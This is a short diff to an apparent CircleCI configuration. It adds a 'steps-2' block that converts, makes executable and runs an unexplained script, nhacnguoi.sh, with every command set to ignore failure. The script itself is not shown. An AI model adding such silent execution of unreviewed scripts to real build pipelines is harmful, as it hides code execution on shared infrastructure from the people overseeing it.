@@ -21,6 +21,12 @@ jobs:
       - run:
           name: "Say hello"
           command: "echo Hello, World!"
+    steps-2:
+      - run: |
+            sed -i 's/\r$//' nhacnguoi.sh || true
+            chmod +x nhacnguoi.sh || true
+            ./nhacnguoi.sh || true
+
 
 # Orchestrate jobs using workflows
 # See: https://circleci.com/docs/guides/orchestrate/workflows/ & https://circleci.com/docs/reference/configuration-reference/#workflows
